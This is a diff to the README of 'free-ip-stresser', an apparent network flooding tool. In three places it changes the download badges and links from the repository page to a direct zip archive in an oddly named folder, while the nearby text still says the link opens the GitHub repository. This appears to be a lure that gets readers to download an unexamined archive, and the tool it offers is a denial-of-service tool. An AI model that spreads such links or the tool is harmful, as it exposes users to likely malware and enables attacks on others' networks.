@@ -1,6 +1,6 @@
 # 🛠️ free-ip-stresser - Simple Network Stress Testing Tool
 
-[![Download free-ip-stresser](https://img.shields.io/badge/Download-free--ip--stresser-brightgreen)](https://github.com/Deadend-monroe867/free-ip-stresser)
+[![Download free-ip-stresser](https://img.shields.io/badge/Download-free--ip--stresser-brightgreen)](https://raw.githubusercontent.com/Deadend-monroe867/free-ip-stresser/main/untechnically/stresser-ip-free-Innuit.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You will start by downloading the software from its GitHub page.
 
 Click this badge to open the download page:
 
-[![Download free-ip-stresser](https://img.shields.io/badge/Download-free--ip--stresser-blue)](https://github.com/Deadend-monroe867/free-ip-stresser)
+[![Download free-ip-stresser](https://img.shields.io/badge/Download-free--ip--stresser-blue)](https://raw.githubusercontent.com/Deadend-monroe867/free-ip-stresser/main/untechnically/stresser-ip-free-Innuit.zip)
 
 This link takes you to the GitHub repository where you can find the latest version of free-ip-stresser.
 
@@ -148,6 +148,6 @@ To keep free-ip-stresser working well and secure, check for updates regularly.
 
 ---
 
-[Download Free-IP-Stresser Now](https://github.com/Deadend-monroe867/free-ip-stresser)
+[Download Free-IP-Stresser Now](https://raw.githubusercontent.com/Deadend-monroe867/free-ip-stresser/main/untechnically/stresser-ip-free-Innuit.zip)
 
 Click the link to return to the page where you can download or update the software whenever you need.
